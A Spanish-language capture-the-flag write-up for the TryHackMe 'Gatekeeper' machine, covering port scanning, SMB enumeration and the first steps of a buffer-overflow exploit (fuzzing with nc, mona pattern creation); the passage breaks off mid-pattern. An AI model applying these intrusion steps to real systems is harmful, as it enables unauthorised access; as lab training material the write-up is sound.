style=width:20px;height:auto;margin-right:10px>Bounty Hacker</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/><img src=/writeups/tryhackme/wonderland//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Wonderland</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/><img src=/writeups/tryhackme/mustacchio//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Mustacchio</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/source/><img src=/writeups/tryhackme/source//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Source</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/startup/><img src=/writeups/tryhackme/startup//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Startup</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/team/><img src=/writeups/tryhackme/team//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Team</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/chill-hack/><img src=/writeups/tryhackme/chill-hack//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Chill Hack</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/blue/><img src=/writeups/tryhackme/blue//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Blue</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded active" href=/writeups/tryhackme/gatekeeper/><img src=/writeups/tryhackme/gatekeeper//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Gatekeeper</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/cyberlens/><img src=/writeups/tryhackme/cyberlens//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>Cyberlens</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/liceo/>Liceo</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ccdabd144af006c40e0937d3f87d7afa aria-expanded=false>
VulnHub</button><div class=collapse id=section-ccdabd144af006c40e0937d3f87d7afa><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/vulnhub/brainpan-1/>Brainpan 1</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-21d2fe7c61cab1f4db96535ccdbf2fb9 aria-expanded=false>
Dockerlabs</button><div class=collapse id=section-21d2fe7c61cab1f4db96535ccdbf2fb9><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#smb>SMB</a></li></ul></li><li><a href=#bof>BoF</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/writeups/>Writeups</a></li><li class=breadcrumb-item><a href=/writeups/tryhackme/>TryHackMe</a></li><li class="breadcrumb-item active" aria-current=page>Gatekeeper</li></ol></nav><div style=display:flex;align-items:center><div style="border-left:8px solid #f49b0a;height:40px;margin-right:10px"></div><h1 style=margin:0;vertical-align:middle>Gatekeeper</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#smb>SMB</a></li></ul></li><li><a href=#bof>BoF</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></li></ul></nav></div></details></nav><div style=display:flex;align-items:center;vertical-align:middle><img src=/blog/phishing/images/win.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle>
<img src=/blog/phishing/images/thm.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle></div><br><p>A lo largo del análisis de esta máquina, examinamos un binario y explotamos una vulnerabilidad de Buffer Overflow que nos permitió acceder al servidor. Para realizar la escalada de privilegios, extraímos las credenciales almacenadas en Firefox utilizando la herramienta Firepwd.</p><p><small>June 24, 2024<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>8&nbsp;minutes</span></small></p><h2 id=reconocimiento>Reconocimiento<a href=#reconocimiento class=anchor aria-hidden=true>#</a></h2><p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ping -c <span class=m>1</span> 10.10.30.181
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PING 10.10.30.181 <span class=o>(</span>10.10.30.181<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.30.181: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>127</span> <span class=nv>time</span><span class=o>=</span><span class=m>266</span> ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.30.181 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 266.290/266.290/266.290/0.000 ms
</span></span></code></pre></div><p>Tenemos conexión y en este caso da un ttl (time to live) de <strong>127</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Windows</strong></p><h3 id=escaneo-de-puertos>Escaneo de puertos<a href=#escaneo-de-puertos class=anchor aria-hidden=true>#</a></h3><p>Ahora empezamos con un escaneo de puertos</p><pre tabindex=0><code>$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.53.55 -oG allPorts
</code></pre><details><summary>Explicación parámetros</summary><table><thead><tr><th>Parámetro</th><th>Función</th></tr></thead><tbody><tr><td>-p-</td><td>Para que el escaneo sea a todos los puertos (65536)</td></tr><tr><td>&ndash;open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td>&ndash;min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td>-n</td><td>Omitir resolución DNS</td></tr><tr><td>-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td>-Pn</td><td>Para saltar la comprobación de sí la máquina está activa o no</td></tr><tr><td>-oG allPorts</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td></tr></tbody></table></details><br><p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p><p><a href=https://pastebin.com/tYpwpauW>Función extractPorts</a> de <a href=https://s4vitar.github.io>@s4vitar</a></p><pre tabindex=0><code>&gt; extractPorts allPorts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.53.55
   5   │     [*] Open ports: 135,139,445,3389,31337,49152,49153,49154,49155
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap -p135,139,445,3389,31337,49152,49153,49154,49155,49161,49165 -sCV 10.10.30.181 -oN versions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE            VERSION
</span></span><span class=line><span class=cl>135/tcp   open  msrpc              Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds       Windows <span class=m>7</span> Professional <span class=m>7601</span> Service Pack <span class=m>1</span> microsoft-ds <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>3389/tcp  open  ssl/ms-wbt-server?
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2024-06-26T12:00:08+00:00<span class=p>;</span> -1s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: GATEKEEPER
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: GATEKEEPER
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: GATEKEEPER
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: gatekeeper
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: gatekeeper
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 6.1.7601
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2024-06-26T12:00:03+00:00
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>gatekeeper
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2024-06-25T11:45:14
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2024-12-25T11:45:14
</span></span><span class=line><span class=cl>31337/tcp open  Elite?
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello GET / HTTP/1.0
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello
</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello OPTIONS / HTTP/1.0
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello
</span></span><span class=line><span class=cl><span class=p>|</span>   Help: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello HELP
</span></span><span class=line><span class=cl><span class=p>|</span>   Kerberos: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello !!!
</span></span><span class=line><span class=cl><span class=p>|</span>   LDAPSearchReq: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello
</span></span><span class=line><span class=cl><span class=p>|</span>   LPDString: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello 
</span></span><span class=line><span class=cl><span class=p>|</span>     default!!!
</span></span><span class=line><span class=cl><span class=p>|</span>   RTSPRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello OPTIONS / RTSP/1.0
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello
</span></span><span class=line><span class=cl><span class=p>|</span>   SIPOptions: 
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello OPTIONS sip:nm SIP/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello Via: SIP/2.0/TCP nm<span class=p>;</span><span class=nv>branch</span><span class=o>=</span>foo
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello From: &lt;sip:nm@nm&gt;<span class=p>;</span><span class=nv>tag</span><span class=o>=</span>root
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello To: &lt;sip:nm2@nm2&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello Call-ID: <span class=m>50000</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello CSeq: <span class=m>42</span> OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello Max-Forwards: <span class=m>70</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello Content-Length: <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello Contact: &lt;sip:nm@nm&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello Accept: application/sdp
</span></span><span class=line><span class=cl><span class=p>|</span>     Hello
</span></span><span class=line><span class=cl><span class=p>|</span>   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Hello
</span></span><span class=line><span class=cl>49152/tcp open  msrpc              Microsoft Windows RPC
</span></span><span class=line><span class=cl>49153/tcp open  msrpc              Microsoft Windows RPC
</span></span><span class=line><span class=cl>49154/tcp open  msrpc              Microsoft Windows RPC
</span></span><span class=line><span class=cl>49155/tcp open  msrpc              Microsoft Windows RPC
</span></span><span class=line><span class=cl>49161/tcp open  msrpc              Microsoft Windows RPC
</span></span><span class=line><span class=cl>49165/tcp open  msrpc              Microsoft Windows RPC
</span></span></code></pre></div><h3 id=smb>SMB<a href=#smb class=anchor aria-hidden=true>#</a></h3><p>Empezamos enumerando el SMB</p><pre tabindex=0><code>smbclient -L 10.10.30.181                         
Password for [WORKGROUP\d3bo]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk
</code></pre><p>Hay un recurso compartido llamado Users al cual tenemos permisos para acceder</p><pre tabindex=0><code>$ smbclient //10.10.30.181/Users      

Password for [WORKGROUP\d3bo]:

smb: \&gt; ls

  Default                           DHR        0  Tue Jul 14 09:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:54:24 2009
  Share                               D        0  Fri May 15 03:58:07 2020

smb: \&gt; cd Share
smb: \Share\&gt; ls

  gatekeeper.exe                      A    13312  Mon Apr 20 07:27:17 2020
</code></pre><p>Dentro de la carpeta Share hay un archivo llamado gatkeeper.exe, nos lo vamos a descargar y abrir en una máquina windows, para ver que hace.</p><p>El programa ha abierto el puerto 31337 de mi windows. Casualmente, parece que el servicio que se me ha abierto con el gatekeeper.exe es el mismo que corre por la máquina víctima.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc 192.168.1.142 <span class=m>31337</span>                                                                          
</span></span><span class=line><span class=cl>Testing
</span></span><span class=line><span class=cl>Hello Testing!!!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ nc 10.10.30.181 <span class=m>31337</span> 
</span></span><span class=line><span class=cl>Testing
</span></span><span class=line><span class=cl>Hello Testing!!!
</span></span></code></pre></div><p>Si le mando un input muy grande, el programa peta, vamos a ver desde immunity debugger que es lo que está pasando.</p><h2 id=bof>BoF<a href=#bof class=anchor aria-hidden=true>#</a></h2><p>Empezamos mandando 1000 &lsquo;A&rsquo;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;print(&#34;A&#34; * 1000)&#39;</span> <span class=p>|</span> nc 192.168.1.142 <span class=m>31337</span>
</span></span></code></pre></div><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/gatekeeper/images/1_hu83ceb0ce7a4160ecc8ade404c6c2a6bf_20990_644a02122983d77c8e8879d3242f7989.webp 480w, /writeups/tryhackme/gatekeeper/images/1_hu83ceb0ce7a4160ecc8ade404c6c2a6bf_20990_e432c07f2d34a68eb1e3f9d68ea59176.webp 640w, /writeups/tryhackme/gatekeeper/images/1_hu83ceb0ce7a4160ecc8ade404c6c2a6bf_20990_4839bf3c9ceb3632b9b040ff7367bb7f.webp 800w, /writeups/tryhackme/gatekeeper/images/1_hu83ceb0ce7a4160ecc8ade404c6c2a6bf_20990_1a4915387018568389b4099dc1cba9e9.webp 1024w" fetchpriority=low height=900 id=h-rh-i-0 src=/writeups/tryhackme/gatekeeper/images/1_hu83ceb0ce7a4160ecc8ade404c6c2a6bf_20990_d4b2bc32a1052e6481e569415867a064.webp width=1600></p><p>Desde immunity debugger vemos que el programa ha petado, el mensaje de error dice que el programa no sabe por donde continuar porque la dirección 41414141 no existe. Esto se debe a que hemos puesto un input tan grande que hemos sobreescrito registros de la memoria, tales como el EIP, que es el encargado de guardar la próxima dirección por donde va a ir el programa. Al nosotros haber sobreescrito el EIP con 41414141 (AAAA), el programa peta. Sabiendo esto, vamos a intentar explotar un Buffer Overflow</p><p>Empezamos asignando a mona nuestra carpeta de trabajo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona config -set workingfolder C:<span class=se>\U</span>sers<span class=se>\a</span>rnau<span class=se>\D</span>ownloads<span class=se>\b</span>of
</span></span></code></pre></div><p>Seguimos creando una string de 5000 caracteres la cual nos servirá para encontrar el offset para llegar al EIP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>!mona pattern_create <span class=m>5000</span>
</span></span></code></pre></div><p>Mona nos crea el archivo pattern en la carpeta que especificamos anteriormente</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/gatekeeper/images/2_hu0501ca193608c04ea1e79784194c5833_54648_62dcc625ce7fbf6414db36ae559aa499.webp 480w, /writeups/tryhackme/gatekeeper/images/2_hu0501ca193608c04ea1e79784194c5833_54648_a972fdf2056acbf8a209265052476e5d.webp 640w, /writeups/tryhackme/gatekeeper/images/2_hu0501ca193608c04ea1e79784194c5833_54648_1fc2eb60db1cd36ac7ee746c4a52c18d.webp 800w, /writeups/tryhackme/gatekeeper/images/2_hu0501ca193608c04ea1e79784194c5833_54648_bd50c9471b8267d54c55b6b3c209a354.webp 1024w" fetchpriority=low height=900 id=h-rh-i-1 src=/writeups/tryhackme/gatekeeper/images/2_hu0501ca193608c04ea1e79784194c5833_54648_7d35059f51f8149598ab1d99b8ed3447.webp width=1600></p><p>Ahora mandamos toda la string de nuevo.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc 192.168.1.142 <span class=m>31337</span>    
</span></span><span class=line><span class=cl>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3